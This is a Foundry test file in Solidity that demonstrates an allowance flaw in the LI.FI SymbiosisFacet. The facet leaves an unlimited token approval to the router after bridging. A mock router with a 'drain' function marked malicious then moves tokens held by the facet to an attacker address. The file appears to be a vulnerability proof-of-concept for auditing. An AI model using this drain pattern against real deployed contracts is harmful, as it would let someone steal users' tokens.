// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {SymbiosisFacet} from "lifi/Facets/SymbiosisFacet.sol";
import {ISymbiosisMetaRouter} from "lifi/Interfaces/ISymbiosisMetaRouter.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockSymbiosisMetaRouter is ISymbiosisMetaRouter {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function metaRoute(
        MetaRouteTransaction calldata _metarouteTransaction
    ) external payable override {
        MockERC20(token).transferFrom(
            msg.sender,
            address(this),
            _metarouteTransaction.amount
        );
    }

    // Malicious function to drain remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract SymbiosisFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockSymbiosisMetaRouter internal router;
    SymbiosisFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        router = new MockSymbiosisMetaRouter(address(token));
        facet = new SymbiosisFacet(router, address(router));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        SymbiosisFacet.SymbiosisData memory symData = SymbiosisFacet.SymbiosisData({
            firstSwapCalldata: "",
            secondSwapCalldata: "",
            intermediateToken: address(0),
            firstDexRouter: address(0),
            secondDexRouter: address(0),
            approvedTokens: new address[](0),
            callTo: address(router),
            callData: ""
        });

        facet.startBridgeTokensViaSymbiosis(bridgeData, symData);

        // allowance remains set after bridging
        assertEq(
            token.allowance(address(facet), address(router)),
            type(uint256).max
        );

        // attacker sends tokens to facet and router drains them
        token.mint(address(facet), 5 ether);
        router.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

